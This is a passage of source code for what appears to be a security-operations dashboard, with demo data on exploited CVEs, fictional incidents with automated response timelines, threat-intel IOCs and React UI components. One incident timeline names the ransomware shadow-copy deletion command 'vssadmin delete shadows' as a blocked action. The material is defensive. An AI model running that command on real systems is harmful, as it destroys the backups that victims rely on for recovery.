  {id:'v2',cve:'CVE-2024-3400',title:'PAN-OS Command Injection — GlobalProtect',severity:'Critical',cvss:10.0,prevalence:88,affected:2,affectedDevices:['FW-EDGE01','FW-BRANCH01'],description:'Critical command injection in Palo Alto GlobalProtect gateway. CVSSv3 10.0. Exploited by nation-state actors (UNC5221) in the wild. Full command execution possible.',remediation:['Apply PAN-OS patch 11.1.2-h3 or later immediately','Enable Threat Prevention signatures for CVE-2024-3400','Review GlobalProtect logs for IOCs: sessions from unexpected IPs','Isolate affected firewalls if patch cannot be applied immediately','Contact Palo Alto PSIRT if compromise suspected'],kev:true,patch:'PAN-OS 11.1.2-h3'},
  {id:'v3',cve:'CVE-2024-27198',title:'JetBrains TeamCity Auth Bypass',severity:'Critical',cvss:9.8,prevalence:76,affected:3,affectedDevices:['SRV-CICD01','SRV-BUILD02','SRV-BUILD03'],description:'Authentication bypass in JetBrains TeamCity build server. Allows unauthenticated remote code execution. APT29 (Cozy Bear) actively exploiting to compromise CI/CD pipelines and inject malicious build artifacts.',remediation:['Upgrade TeamCity to version 2023.11.4 immediately','If upgrade not possible, restrict TeamCity to VPN access only','Review all build logs for unexpected plugin installations','Audit service account permissions used by TeamCity','Check build artifacts for unexpected modifications'],kev:true,patch:'TeamCity 2023.11.4'},
  {id:'v4',cve:'CVE-2023-46805',title:'Ivanti ICS/IPS Authentication Bypass',severity:'Critical',cvss:8.2,prevalence:71,affected:1,affectedDevices:['IVANTI-GW01'],description:'Authentication bypass affecting Ivanti Connect Secure and Policy Secure. Chained with CVE-2024-21887 for RCE. Mass exploitation observed. CISA emergency directive issued.',remediation:['Apply Ivanti patch immediately or take gateway offline','Run Ivanti Integrity Checker Tool','Reset all passwords for users authenticated via affected gateway','Review SIEM for suspicious authentication patterns','Consider replacing with alternative VPN solution if persistent issues'],kev:true},
  {id:'v5',cve:'CVE-2024-1708',title:'ConnectWise ScreenConnect Path Traversal',severity:'Critical',cvss:8.4,prevalence:65,affected:1,affectedDevices:['SCREENCONNECT01'],description:'Path traversal vulnerability in ConnectWise ScreenConnect. Allows unauthenticated RCE. Ransomware groups actively using this to gain initial access to MSP-managed networks.',remediation:['Upgrade ScreenConnect to version 23.9.8 or later','If upgrade delayed, disable external access until patched','Review ScreenConnect audit logs for unauthorized sessions','Check all managed endpoints for unauthorized ScreenConnect sessions','Alert clients if you are an MSP using ScreenConnect'],kev:true,patch:'ScreenConnect 23.9.8'},
  {id:'v6',cve:'CVE-2024-21762',title:'Fortinet FortiOS OOB Write — SSL VPN',severity:'Critical',cvss:9.6,prevalence:82,affected:2,affectedDevices:['FORTI-EDGE01','FORTI-DR01'],description:'Out-of-bounds write in Fortinet FortiOS SSL VPN. No authentication required. Likely exploited in the wild. Fortinet issued emergency patch.',remediation:['Upgrade FortiOS to 7.4.3 or 7.2.7 immediately','Disable SSL VPN if upgrade cannot be applied immediately','Monitor for IOCs: unexpected admin account creation, config changes','Check FortiGuard subscription is active and updated','Verify all admin accounts — delete any unrecognised'],kev:true,patch:'FortiOS 7.4.3'},
  {id:'v7',cve:'CVE-2024-20767',title:'Adobe ColdFusion RCE — Public Files',severity:'High',cvss:8.7,prevalence:58,affected:4,affectedDevices:['SRV-WEB01','SRV-WEB02','SRV-WEB03','SRV-WEB04'],description:'Remote code execution in Adobe ColdFusion via the administrator panel. Allows arbitrary file read and potential RCE. Web-facing ColdFusion servers at significant risk.',remediation:['Apply Adobe patch APSB24-14 immediately','If ColdFusion admin interface is internet-facing, take offline','Restrict admin interface to management VLAN only','Enable WAF rules for ColdFusion exploit attempts','Review web server logs for scanning activity'],kev:false,patch:'APSB24-14'},
  {id:'v8',cve:'CVE-2024-22024',title:'Ivanti Connect Secure XXE Injection',severity:'High',cvss:8.3,prevalence:52,affected:1,affectedDevices:['IVANTI-GW01'],description:'XXE injection in Ivanti Connect Secure and Neurons for ZTA. Can be used to access sensitive files. Affects same device-2023-46805 — prioritise remediation.',remediation:['Covered by same Ivanti patch-2023-46805','Verify patch applied to both vulnerabilities simultaneously','Run Ivanti ICT scan post-patching','Monitor for XML-related errors in gateway logs'],kev:false},
  {id:'v9',cve:'CVE-2024-27956',title:'WordPress Automatic Plugin SQL Injection',severity:'High',cvss:9.8,prevalence:45,affected:2,affectedDevices:['SRV-WEB02','SRV-WEB03'],description:'Critical SQL injection in WordPress Automatic plugin. Allows unauthenticated attackers to create admin users and upload webshells. Rapidly weaponised.',remediation:['Update Automatic plugin to version 3.92.1 or later','Scan WordPress installations for unauthorized admin accounts','Check for uploaded files in wp-content/uploads — remove suspicious','Enable WAF plugin (Wordfence) or cloud WAF rule','Consider disabling XML-RPC if not needed'],kev:false,patch:'Automatic plugin 3.92.1'},
  {id:'v10',cve:'CVE-2023-48788',title:'Fortinet EMS SQL Injection — RCE',severity:'High',cvss:9.3,prevalence:38,affected:1,affectedDevices:['EMS-SERVER01'],description:'SQL injection in Fortinet FortiClientEMS. Enables RCE without authentication. Widely exploited against internet-exposed EMS servers. DoJ charged attackers exploiting this.',remediation:['Upgrade FortiClientEMS to 7.2.3 or 7.0.10','Restrict EMS to internal network — no direct internet exposure','Check EMS logs for unauthorized SQL activity','Audit all managed endpoint agents for unexpected configuration changes'],kev:true,patch:'FortiClientEMS 7.2.3'},
];

const DEMO_INCIDENTS = [
  {id:'INC-0847',title:'Domain Controller Compromise — admin_svc Credential Dump',severity:'Critical',status:'Active',assignedTo:'Sarah Chen',created:'2026-03-30 09:14',updated:'2026-03-30 09:47',alertCount:4,devices:['DC01','SRV-FINANCE01','laptop-CFO01'],mitreTactics:['Initial Access','Credential Access','Lateral Movement'],aiSummary:'Multi-stage credential theft attack targeting domain infrastructure. Attacker gained initial access via spear-phish, executed LSASS dump on DC01, and used compromised admin_svc credentials to move laterally to SRV-FINANCE01. C2 beacon detected and blocked. Domain credentials at high risk — immediate reset recommended.',timeline:[
    {t:'09:14',actor:'AI',action:'Initial alert correlated',detail:'LSASS access on DC01 — Incident created, Tier 2 paged'},
    {t:'09:15',actor:'AI',action:'admin_svc account disabled',detail:'Auto-response: account suspended across all domain controllers'},
    {t:'09:16',actor:'AI',action:'C2 traffic blocked',detail:'IP 185.220.101.42 blocked at Zscaler perimeter'},
    {t:'09:22',actor:'Sarah Chen',action:'Confirmed TP — escalated to IC',detail:'DC01 isolated. Memory forensic image requested'},
    {t:'09:47',actor:'AI',action:'Kill chain analysis complete',detail:'MITRE mapping: T1566.001 to T1003.001 to T1078 to T1021.002'},
  ]},
  {id:'INC-0846',title:'Suspected Insider Threat — Data Exfiltration',severity:'High',status:'Contained',assignedTo:'James Harlow',created:'2026-03-30 08:45',updated:'2026-03-30 09:12',alertCount:3,devices:['laptop-HR03','cloud-email'],mitreTactics:['Collection','Exfiltration'],aiSummary:'HR employee with active resignation notice uploaded 18GB of payroll and personnel data to personal Google Drive. Email forwarding rule discovered directing inbox to personal Gmail. DLP policies enforced, legal team notified. Data exfiltration contained — no external breach confirmed.',timeline:[
    {t:'08:45',actor:'AI',action:'DLP alert correlated with HR data',detail:'Zscaler flagged 18GB upload. HR system integration confirmed resignation notice'},
    {t:'08:47',actor:'AI',action:'Upload throttled',detail:'Zscaler policy updated to block personal cloud storage for this user'},
    {t:'09:00',actor:'AI',action:'Email forwarding rule discovered and deleted',detail:'3,200 emails forwarded to personal Gmail in 48h. Rule removed. HR and Legal auto-notified'},
    {t:'09:12',actor:'James Harlow',action:'Incident contained — legal review underway',detail:'IT forensics preserving audit trail. Device remote wipe scheduled for departure date'},
  ]},
  {id:'INC-0845',title:'C2 Beacon — Cobalt Strike HTTPS via Proxy',severity:'High',status:'Active',assignedTo:'Sarah Chen',created:'2026-03-30 07:30',updated:'2026-03-30 08:15',alertCount:5,devices:['WS-DEV03','WS-DEV07'],mitreTactics:['Command and Control','Defense Evasion'],aiSummary:'Cobalt Strike HTTPS beacon on two developer workstations using Akamai masquerade profile. Attacker maintaining persistent access — likely pre-ransomware staging.',timeline:[
    {t:'07:30',actor:'AI',action:'Darktrace anomaly correlated',detail:'Unusual HTTPS POST to cdn-delivery[.]io — Cobalt Strike beacon signature'},
    {t:'07:35',actor:'AI',action:'DNS blocked at Zscaler',detail:'IOC cdn-delivery[.]io blocked network-wide'},
    {t:'08:15',actor:'Sarah Chen',action:'Escalated — IR team engaged',detail:'Forensic triage underway on WS-DEV03. SentinelOne deep scan initiated'},
  ]},
  {id:'INC-0844',title:'Brute Force Success — VPN Admin Account Compromised',severity:'High',status:'Escalated',assignedTo:'Emma Wilson',created:'2026-03-29 22:41',updated:'2026-03-30 06:00',alertCount:2,devices:['vpn-gw01'],mitreTactics:['Initial Access','Persistence'],aiSummary:'VPN admin account brute-forced after 847 failed attempts. Attacker changed DNS settings. MFA was not enabled on this account — corrected immediately.',timeline:[
    {t:'22:41',actor:'AI',action:'Brute force threshold exceeded',detail:'847 failed logins in 18min. Account locked automatically'},
    {t:'22:44',actor:'AI',action:'Account compromise detected',detail:'Successful login from RO/185.220.0.0/16 after lockout reset'},
    {t:'06:00',actor:'Emma Wilson',action:'MFA enforced — root cause addressed',detail:'All VPN admin accounts now require MFA. Password policy hardened'},
  ]},
  {id:'INC-0843',title:'Ransomware Precursor — LOTL Activity on 3 Servers',severity:'Critical',status:'Active',assignedTo:'Nick Taylor',created:'2026-03-29 14:22',updated:'2026-03-30 05:30',alertCount:8,devices:['SRV-APP01','SRV-APP02','SRV-DB01'],mitreTactics:['Discovery','Lateral Movement','Persistence','Defense Evasion'],aiSummary:'Cluster of living-off-the-land techniques consistent with pre-ransomware staging. WMI enumeration, scheduled task creation, shadow copy deletion attempt. 3 servers affected. Immediate IR engagement required.',timeline:[
    {t:'14:22',actor:'AI',action:'LOTL cluster detected',detail:'WMI queries + scheduled tasks on 3 servers in 4min — ransomware precursor signature'},
    {t:'14:23',actor:'AI',action:'Servers isolated via CrowdStrike',detail:'SRV-APP01, APP02, DB01 quarantined. SOC Tier 3 paged'},
    {t:'14:30',actor:'AI',action:'Shadow copy deletion blocked',detail:'Defender blocked vssadmin delete shadows'},
    {t:'05:30',actor:'Nick Taylor',action:'Update: lateral movement paths mapped',detail:'Pivot point: compromised service account from phishing 6 weeks ago'},
  ]},
  {id:'INC-0842',title:'OAuth App Consent Phishing — Admin Directory Access',severity:'Medium',status:'Resolved',assignedTo:'James Harlow',created:'2026-03-28 11:15',updated:'2026-03-28 14:30',alertCount:2,devices:['cloud-identity'],mitreTactics:['Initial Access','Privilege Escalation'],aiSummary:'Malicious OAuth app granted Directory.ReadWrite.All by admin via consent phishing. Revoked in 45 minutes. No data exfil confirmed. Admin consent workflow now enforced.',timeline:[
    {t:'11:15',actor:'AI',action:'Suspicious OAuth consent detected',detail:'Unverified app granted Directory.ReadWrite.All — T1528'},
    {t:'11:18',actor:'AI',action:'App access suspended',detail:'Conditional access blocked app. Admin alerted'},
    {t:'14:30',actor:'James Harlow',action:'Incident resolved',detail:'Admin consent workflow enforced. Security awareness triggered for affected user'},
  ]},
];

const DEMO_INTEL_BY_INDUSTRY = {
  'Financial Services':[
    {id:'i1',title:'TA505 Targeting UK Banks — Cobalt Strike Deployment',summary:'TA505 (Clop ransomware affiliate) observed targeting UK financial institutions with spear-phishing campaigns delivering Cobalt Strike beacons via fake SWIFT notification emails. 3 UK banks confirmed compromised in the last 14 days.',severity:'Critical',source:'NCSC & ThreatFox',time:'2h ago',iocs:['185.220.101.42','hxxps://swift-notification[.]com','cobalt-cs-payload-2024.exe'],mitre:'T1566.001',industrySpecific:true,url:'https://www.ncsc.gov.uk/news/ta505-targeting-uk-financial-sector'},
    {id:'i2',title:'QakBot Resurgence — Banking Trojans via PDF Lures',summary:'QakBot (QBot) back in circulation after law enforcement takedown. New infrastructure and updated PDF lure themed around invoice disputes. Financial sector primary target. High evasion capability — bypasses standard email security.',severity:'High',source:'CISA KEV',time:'6h ago',iocs:['invoice-dispute-2024.pdf','hxxp://qakbot-new[.]ru'],mitre:'T1566.001',industrySpecific:true,url:'https://www.bleepingcomputer.com/news/security/qakbot-returns-new-pdf-lures-targeting-financial-sector/'},
    {id:'i3',title:'SWIFT Customer Security Programme — Audit Deadline',summary:'SWIFT CSP mandatory controls attestation deadline approaching. Ensure your SWIFT connector environments comply with CSP 2024 requirements, particularly around multi-factor authentication and anomaly detection integration.',severity:'Medium',source:'SWIFT ISAC',time:'1d ago',industrySpecific:true,url:'https://www.swift.com/our-solutions/compliance-and-shared-services/financial-crime-cyber-security'},
  ],
  'Healthcare':[
    {id:'i4',title:'Rhysida Ransomware Targeting NHS Trusts',summary:'Rhysida ransomware group actively targeting NHS Trusts and healthcare providers. Gain access via phishing, move laterally to clinical systems, and exfiltrate patient data before encryption. 4 NHS Trusts hit in last 30 days.',severity:'Critical',source:'NCSC Health Alert',time:'4h ago',iocs:['rhysida-ransom.onion','185.181.60.92','health-tender-2024.exe'],mitre:'T1486',industrySpecific:true,url:'https://www.ncsc.gov.uk/news/rhysida-ransomware-targeting-healthcare'},
    {id:'i5',title:'DICOM Vulnerability — Medical Imaging Systems Exposed',summary:'Multiple DICOM-compliant medical imaging systems found to have patient data exposed on the internet without authentication. Check for internet-exposed DICOM servers on port 104. Over 1,000 UK systems found exposed in recent scan.',severity:'High',source:'Cynerio Research',time:'1d ago',industrySpecific:true,url:'https://cynerio.com/blog'},
  ],
  'default':[
    {id:'def1',title:'CISA KEV Update — CVE-2024-21413, CVE-2024-3400, CVE-2024-27198',summary:'CISA added three critical CVEs to the Known Exploited Vulnerabilities catalog: CVE-2024-21413 (Microsoft Outlook RCE), CVE-2024-3400 (PAN-OS command injection), CVE-2024-27198 (JetBrains TeamCity auth bypass). All actively exploited. Patch deadline: 72 hours.',severity:'Critical',source:'CISA KEV',time:'3h ago',iocs:['CVE-2024-21413','CVE-2024-3400','CVE-2024-27198'],mitre:'T1190',industrySpecific:false,url:'https://www.cisa.gov/known-exploited-vulnerabilities-catalog'},
    {id:'def2',title:'LockBit 3.0 Infrastructure Resurfaces Post-Takedown',summary:'LockBit 3.0 operational infrastructure identified on new IP ranges following law enforcement takedown. Group recruiting new affiliates and offering updated locker with improved evasion. Healthcare and financial sectors primary targets.',severity:'High',source:'ThreatFox',time:'8h ago',iocs:['185.220.101.0/24','lockbit-ransom3.com'],mitre:'T1486',industrySpecific:false,url:'https://www.bleepingcomputer.com/news/security/lockbit-returns-new-infrastructure-post-takedown/'},
    {id:'def3',title:'ThreatFox IOC Feed — 847 New C2 Indicators',summary:'ThreatFox published 847 new command-and-control indicators in the last 24 hours. Predominant malware families: AsyncRAT, RedLine Stealer, Cobalt Strike. Recommend enriching alert triage rules with updated IOC set.',severity:'Medium',source:'ThreatFox',time:'1h ago',industrySpecific:false,url:'https://threatfox.abuse.ch/export/'},
    {id:'def4',title:'URLhaus Phishing Kit — 23 New Malicious Domains',summary:'23 newly registered domains identified distributing credential harvesting kits mimicking Microsoft 365, DocuSign, and SharePoint. All domains registered in last 72h with low reputation.',severity:'Medium',source:'URLhaus',time:'2h ago',industrySpecific:false,url:'https://urlhaus.abuse.ch/browse/'},
  ],
  'tenable_news':[
    {id:'tn1',title:'Apache Struts RCE (CVE-2024-53677) Actively Exploited In The Wild',summary:'Tenable Research confirms active exploitation of the Apache Struts file upload path traversal leading to remote code execution. Affects Struts 2.0.0–2.3.37, 2.5.0–2.5.33, and 6.0.0–6.3.0.1. Public PoC available. Patch to 6.4.0 immediately.',severity:'Critical',source:'Tenable Research',time:'2d ago',iocs:['CVE-2024-53677'],mitre:'T1190',industrySpecific:false,url:'https://www.tenable.com/blog/cve-2024-53677-critical-apache-struts-rce-flaw-exploited-in-the-wild'},
    {id:'tn2',title:'Ivanti Connect Secure Zero-Days (CVE-2025-0282, CVE-2025-0283) Exploited Pre-Patch',summary:'Two new vulnerabilities in Ivanti Connect Secure VPN exploited by nation-state actors before patches were available. CVE-2025-0282 allows unauthenticated RCE. CISA issued emergency directive. Tenable scanner plugins published same day as disclosure.',severity:'Critical',source:'Tenable Research',time:'5d ago',iocs:['CVE-2025-0282','CVE-2025-0283'],mitre:'T1133',industrySpecific:false,url:'https://www.tenable.com/blog/cve-2025-0282-cve-2025-0283-ivanti-connect-secure-zero-days'},
    {id:'tn3',title:'Windows LDAP RCE (CVE-2024-49112) — Critical Patch Tuesday Finding',summary:'Tenable Research identified a critical Windows LDAP heap overflow allowing unauthenticated RCE against domain controllers. CVSS 9.8. Exploitation requires sending a specially crafted LDAP request. All supported Windows Server versions affected. Patch Tuesday fix available.',severity:'Critical',source:'Tenable Research',time:'1w ago',iocs:['CVE-2024-49112'],mitre:'T1210',industrySpecific:false,url:'https://www.tenable.com/blog/cve-2024-49112-critical-windows-ldap-vulnerability'},
  ],
};

// ─── Helpers ──────────────────────────────────────────────────────────────────
function SevBadge({sev}) {
  const icons = {Critical:'▲',High:'●',Medium:'◆',Low:'▼',Info:'○'};
  return <span title={sev} style={{fontSize:'0.84rem',fontWeight:800,padding:'1px 6px',borderRadius:3,color:'#fff',background:SEV_COLOR[sev],display:'inline-flex',alignItems:'center',gap:3}}><span style={{fontSize:'0.6rem'}}>{icons[sev]||'●'}</span>{sev.toUpperCase()}</span>;
}

// ─── Modal ────────────────────────────────────────────────────────────────────

function Modal({title,onClose,children}) {
  return (
    <div style={{position:'fixed',inset:0,background:'rgba(0,0,0,0.75)',zIndex:200,display:'flex',alignItems:'center',justifyContent:'center',padding:20}} onClick={onClose}>
      <div style={{background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:16,maxWidth:700,width:'100%',maxHeight:'85vh',overflow:'auto',position:'relative'}} onClick={e=>e.stopPropagation()}>
        <div style={{display:'flex',alignItems:'center',padding:'16px 20px',borderBottom:'1px solid #1d2535',position:'sticky',top:0,background:'var(--wt-card2)',zIndex:10}}>
          <span style={{fontWeight:700,fontSize:'0.92rem'}}>{title}</span>
          <button onClick={onClose} style={{marginLeft:'auto',background:'none',border:'none',color:'var(--wt-muted)',cursor:'pointer',fontSize:'1.2rem',lineHeight:1}}>×</button>
        </div>
        <div style={{padding:20}}>{children}</div>
      </div>
    </div>
  );
}

// ─── Stat Card ────────────────────────────────────────────────────────────────

function StatCard({val,label,sub,color,onClick}) {
  return (
    <div onClick={onClick} style={{padding:'14px 12px',background:'var(--wt-card)',border:'1px solid #1d2535',borderRadius:10,textAlign:'center',cursor:onClick?'pointer':'default',transition:'border-color .15s'}}
      onMouseEnter={e=>{ if(onClick)(e.currentTarget).style.borderColor='#4f8fff40'; }}
      onMouseLeave={e=>{ (e.currentTarget).style.borderColor='var(--wt-border)'; }}>
      <div style={{fontSize:'1.5rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color,letterSpacing:-1}}>{val}</div>
      <div style={{fontSize:'0.86rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.4px',marginTop:2}}>{label}</div>
      {sub && <div style={{fontSize:'0.8rem',color:'var(--wt-dim)',marginTop:2}}>{sub}</div>}
      {onClick && <div style={{fontSize:'0.58rem',color:'#4f8fff',marginTop:4}}>click to view →</div>}
    </div>
  );
}

// ─── Paywall Gate ────────────────────────────────────────────────────────────

function GateWall({ feature, requiredTier, children, userTier, isAdmin, demoPreview }) {
  const levels = {community:0,team:1,business:2,mssp:3};
  if (isAdmin || (levels[userTier]||0) >= levels[requiredTier]) return (<>{children}</>);
  const blurContent = demoPreview || children;
  const tierColors = {team:'#4f8fff',business:'#22d49a',mssp:'#8b6fff'};
  const tierNames = {team:'Essentials',business:'Professional',mssp:'Enterprise'};
  const tierPrices = {team:'£149/seat/mo',business:'£1,199/mo',mssp:'£3,499/mo'};
  const featureDetails = {
    'Threat Intelligence': ['Live threat feeds by industry','IOC matching against your alerts','ThreatFox, NCSC & CISA advisories','Hunt query generation per threat'],
    'Incident Management': ['Group alerts into investigations','AI attack narrative & timeline','Deep Investigate — root cause analysis','Shift handover briefs'],
    'AI Attack Narrative': ['Full attack story from raw alerts','Lateral movement mapping','Forensic command recommendations','MITRE technique chain visualisation'],
    'Compliance Mapping': ['MITRE → ISO 27001 / NIST / CE mapping','NIS2 & DORA export reports','Board-ready PDF generation','SLA reporting by severity'],
  };
  const bullets = featureDetails[feature] || [`Unlock ${feature}`,'Available on paid plans'];
  return (
    <div style={{position:'relative',overflow:'hidden',borderRadius:12}}>
      <div style={{filter:'blur(4px)',opacity:0.25,pointerEvents:'none',userSelect:'none'}}>{blurContent}</div>
      <div style={{position:'absolute',inset:0,display:'flex',flexDirection:'column',alignItems:'center',justifyContent:'center',background:'rgba(5,5,8,0.88)',backdropFilter:'blur(4px)',borderRadius:12,border:`1px solid ${tierColors[requiredTier]}25`,padding:'24px 20px'}}>
        <div style={{width:36,height:36,borderRadius:10,background:`${tierColors[requiredTier]}15`,border:`1px solid ${tierColors[requiredTier]}30`,display:'flex',alignItems:'center',justifyContent:'center',fontSize:'1.1rem',marginBottom:12}}>🔒</div>
        <div style={{fontSize:'0.86rem',fontWeight:800,marginBottom:6,color:'var(--wt-text)'}}>{feature}</div>
        <div style={{display:'flex',flexDirection:'column',gap:4,marginBottom:16,maxWidth:280,width:'100%'}}>
          {bullets.map((b,i)=>(
            <div key={i} style={{display:'flex',alignItems:'center',gap:7,fontSize:'0.84rem',color:'var(--wt-muted)'}}>
              <span style={{color:tierColors[requiredTier],flexShrink:0,fontSize:'0.84rem'}}>✓</span>{b}
            </div>
          ))}
        </div>
        <a href='/pricing' style={{padding:'9px 22px',borderRadius:8,background:tierColors[requiredTier],color:'#fff',fontSize:'0.84rem',fontWeight:700,textDecoration:'none',display:'inline-block',marginBottom:6}}>Unlock with {tierNames[requiredTier]} — {tierPrices[requiredTier]}</a>
        <div style={{fontSize:'0.84rem',color:'var(--wt-dim)'}}>14-day free trial · No card required</div>
      </div>
    </div>
  );
}

// ─── AI Remediation Output Renderer ─────────────────────────────────────────

function RemediationOutput({ text }) {
  const [copied, setCopied] = useState(null);

  function copyCode(code, id) {
    navigator.clipboard.writeText(code).then(()=>{
      setCopied(id);
      setTimeout(()=>setCopied(null), 2000);
    });
  }

  // Parse text into sections. Detect: ALL-CAPS headings, KQL QUERY N:, code blocks
  const lines = text.split('\n');
  const blocks = [];
  let codeBuffer = [];
  let inCode = false;
  let codeId = 0;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const trimmed = line.trim();
    if (!trimmed) { if (!inCode) continue; }

    // Detect code block start: line ending in { or contains | where or | search or | stats
    const endsWithOp = ['{','}',';','|'].some(c=>trimmed.endsWith(c)); const isCodeLine = endsWithOp || /^(DeviceProcess|DeviceNetwork|Security|Identity|Cloud|Mailbox|source=|index=)/.test(trimmed) || (inCode && trimmed.length > 0);
    const isQueryLabel = /^(KQL QUERY|SPLUNK QUERY|SENTINEL|DEFENDER|MICROSOFT|SOURCE=)/i.test(trimmed);
    const isMajorHeading = /^[A-Z][A-Z\s\-:\/]+$/.test(trimmed) && trimmed.length > 8 && trimmed.length < 80 && !isCodeLine;
    const isSubHeading = /^(KQL QUERY \d+:|SPLUNK QUERY FOR |MICROSOFT |DETECTION |REMEDIATION |COMPENSATING |COMMON |HOW ATTACKERS)/i.test(trimmed);

    if (isSubHeading || isQueryLabel) {
      if (inCode && codeBuffer.length) { blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) }); codeBuffer = []; inCode = false; }
      blocks.push({ type:'subheading', content:trimmed });
      inCode = true; // next lines are likely code
    } else if (isMajorHeading) {
      if (inCode && codeBuffer.length) { blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) }); codeBuffer = []; inCode = false; }
      blocks.push({ type:'heading', content:trimmed });
      inCode = false;
    } else if (inCode && trimmed) {
      codeBuffer.push(line);
    } else {
      if (codeBuffer.length) { blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) }); codeBuffer = []; inCode = false; }
      blocks.push({ type:'text', content:trimmed });
    }
  }
  if (codeBuffer.length) blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) });

  return (
    <div style={{display:'flex',flexDirection:'column',gap:10}}>
      {blocks.map((block, i) => {
        if (block.type === 'heading') return (
          <div key={i} style={{fontSize:'0.82rem',fontWeight:800,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'1.5px',paddingTop: i>0?8:0,borderTop: i>0?'1px solid var(--wt-border)':'none',marginTop: i>0?2:0}}>{block.content}</div>
        );
        if (block.type === 'subheading') return (
          <div key={i} style={{fontSize:'0.84rem',fontWeight:700,color:'var(--wt-text)',marginTop:4,marginBottom:-4}}>{block.content}</div>
        );
        if (block.type === 'code') return (
          <div key={i} style={{position:'relative',background:'#020306',border:'1px solid #1a2235',borderRadius:8,overflow:'hidden'}}>
            <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',padding:'5px 10px',borderBottom:'1px solid #1a2235',background:'#060912'}}>
              <span style={{fontSize:'0.86rem',fontWeight:700,color:'#4f8fff',letterSpacing:'0.5px',textTransform:'uppercase'}}>Query</span>
              <button onClick={()=>copyCode(block.content, block.id||'')} style={{fontSize:'0.8rem',fontWeight:600,padding:'2px 8px',borderRadius:4,border:'1px solid #1e2536',background:'transparent',color:copied===block.id?'#22d49a':'var(--wt-muted)',cursor:'pointer',fontFamily:'Inter,sans-serif',transition:'color .15s'}}>
                {copied===block.id?'✓ Copied':'Copy'}
              </button>
            </div>
            <pre style={{margin:0,padding:'10px 12px',fontSize:'0.63rem',fontFamily:'JetBrains Mono,monospace',color:'#a8c0e8',lineHeight:1.7,overflowX:'auto',whiteSpace:'pre-wrap',wordBreak:'break-all'}}>{block.content.trim()}</pre>
          </div>
        );
        return (
          <div key={i} style={{fontSize:'0.8rem',color:'var(--wt-secondary)',lineHeight:1.7}}>{block.content}</div>
        );
      })}
    </div>
  );
}
export default function DashboardPage() {
  const [activeTab, setActiveTab] = useState('overview');
  const [automation, setAutomation] = useState(1);
  const [modal, setModal] = useState(null);
  const [selectedVuln, setSelectedVuln] = useState(null);
  const [selectedIncident, setSelectedIncident] = useState(null);
  const [vulnAiLoading, setVulnAiLoading] = useState(null);
  const [vulnAiTexts, setVulnAiTexts] = useState({});
  const [industry, setIndustry] = useState('Financial Services');
  // Load persisted settings from Redis on mount
  useEffect(()=>{
    fetch('/api/settings/user',{headers:{'x-tenant-id':tenantRef.current}})
      .then(r=>r.json())
      .then(d=>{
        if (d.settings?.industry) {
          setIndustry(d.settings.industry);
          // Auto-fetch live intel on mount with saved industry
          if (d.settings.demoMode !== 'true') {
            fetchIntelForIndustry(d.settings.industry);
          }
        }
        // Load persisted alert notes
        fetch('/api/alert-notes',{headers:{'x-tenant-id':tenantRef.current}}).then(r=>r.json()).then(d=>{if(d.notes&&typeof d.notes==='object')setAlertNotes(d.notes);}).catch(()=>{});
        fetch('/api/alert-state',{headers:{'x-tenant-id':tenantRef.current}}).then(r=>r.json()).then(d=>{if(d.overrides&&typeof d.overrides==='object')setAlertOverrides(d.overrides);if(d.assignees&&typeof d.assignees==='object')setAlertAssignees(d.assignees);}).catch(()=>{});
        // Load persisted incidents (created by analyst, survive refresh)
        fetch('/api/incidents',{headers:{'x-tenant-id':tenantRef.current}}).then(r=>r.json()).then(d=>{
          if(d.ok && Array.isArray(d.incidents) && d.incidents.length > 0) {
            setCreatedIncidents(d.incidents);
            // Restore statuses and notes from persisted data
            const statuses = {};
            const notes = {};
            d.incidents.forEach(inc => {
              if (inc.status) statuses[inc.id] = inc.status;
              if (inc.notes?.length) notes[inc.id] = inc.notes;
            });
            if (Object.keys(statuses).length) setIncidentStatuses(prev => ({...statuses, ...prev}));
            if (Object.keys(notes).length) setIncidentNotes(prev => ({...prev, ...notes}));
          }
        }).catch(()=>{});
        if (d.settings?.demoMode !== undefined) {
          setDemoMode(d.settings.demoMode === 'true');
        } else {
          // First visit — save the default (true) so subsequent refreshes are stable
          fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({demoMode:'true'})}).catch(()=>{});
        }
        if (d.settings?.automation !== undefined) setAutomation(Number(d.settings.automation));
        if (d.settings?.userTier) setUserTier(d.settings.userTier);
        if (d.settings?.clientBanner) setClientBanner(d.settings.clientBanner || null);
      })
      .catch(()=>{});
  },[]);
  function setIndustryPersisted(ind) {
    setIndustry(ind);
    fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({industry:ind})}).catch(()=>{});
  }
  const [intelLoading, setIntelLoading] = useState(false);
  const [customIntel, setCustomIntel] = useState(null);
  const [intelFetchedAt, setIntelFetchedAt] = useState(null);
  const [livetenableNews, setLiveTenableNews] = useState([]);
  const [msspBranding, setMsspBranding] = useState(null);
  const [shiftHandover, setShiftHandover] = useState(null);
  const [showOnboarding, setShowOnboarding] = useState(false);
  const [onboardingStep, setOnboardingStep] = useState(0);
  const [handoverLoading, setHandoverLoading] = useState(false); // {name,primaryColor,accentColor}
  const intelAutoRefreshRef = React.useRef(null);
  const [expandedAlerts, setExpandedAlerts] = useState(new Set());
  // Alerts tab features
  const [alertSearch, setAlertSearch] = useState('');
  const [alertSevFilter, setAlertSevFilter] = useState('all');
  const [alertSrcFilter, setAlertSrcFilter] = useState('all');
  const [alertSort, setAlertSort] = useState('time-desc');
  const [alertPage, setAlertPage] = useState(0);
  const [selectedAlerts, setSelectedAlerts] = useState(new Set());
  const [alertNotes, setAlertNotes] = useState({});
  const [editingNote, setEditingNote] = useState(null);
  const [createdIncidents, setCreatedIncidents] = useState([]);
  const [alertOverrides, setAlertOverrides] = useState({});
  const [autoClosedIds, setAutoClosedIds] = useState(new Set()); // Track auto-closed FPs for UI without re-render loop
